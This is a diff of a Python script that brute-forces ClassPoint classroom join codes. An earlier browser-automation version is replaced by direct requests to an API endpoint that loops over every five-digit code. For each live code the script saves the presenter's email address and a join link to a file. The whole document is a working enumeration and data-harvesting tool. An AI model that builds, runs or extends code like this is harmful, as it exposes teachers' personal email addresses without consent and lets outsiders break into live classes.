@@ -1,26 +1,42 @@
-from selenium.webdriver.chrome.options import Options
-from selenium import webdriver
+import os
+import sys
 import time
+import requests
 
-options = Options()
-# options.add_argument("--log-level=3")
+from src.args import *
 
-driver = webdriver.Chrome(options=options)
+os.chdir(os.path.dirname(os.path.abspath(__file__)))
+starttime = time.strftime("%d-%m-%y_%H:%M:%S")
 
-driver.get("https://www.classpoint.app/")
+if not os.path.isdir("links"):
+    os.mkdir("links")
 
-code = 9999
+if len(sys.argv) > 1:
+    parse_args(sys.argv[1:])
+
+print("\033c")
+print_version("\nSearching...\n")
+
+# create the file in write mode
+with open(f"links/links_{starttime}.txt", "w") as f:
+    f.write("")
+
+code = 10200
+
 while code < 99999:
-    try:
+    data = requests.get(f"https://apitwo.classpoint.app/classcode/region/byclasscode?classcode={code}")
+    if data.status_code != 200:
         code += 1
-        driver.refresh()
-        print(f"entering code {code}")
-        driver.find_element("id",
-            'standard-basic').send_keys(code)
-        print("clicked join")
-        driver.find_element("xpath",
-            '//*[@id="root"]/div/div[1]/div[3]/div/div/div[2]/div[2]/button').click()
-    except:
-        break
+        continue
 
-print(f"class code found: {code}")
+    resData = data.json()
+
+    with open(f"links/links_{starttime}.txt", "a") as f:
+        f.write(f"Email: {resData['presenterEmail']}\nhttps://www.classpoint.app/?code={code}\n\n")
+
+    print("Class code found: " + str(code))
+    print("Link saved.\n")
+
+    code += 1
+
+print("Search completed. Links saved to links/links_" + starttime + ".txt\n")
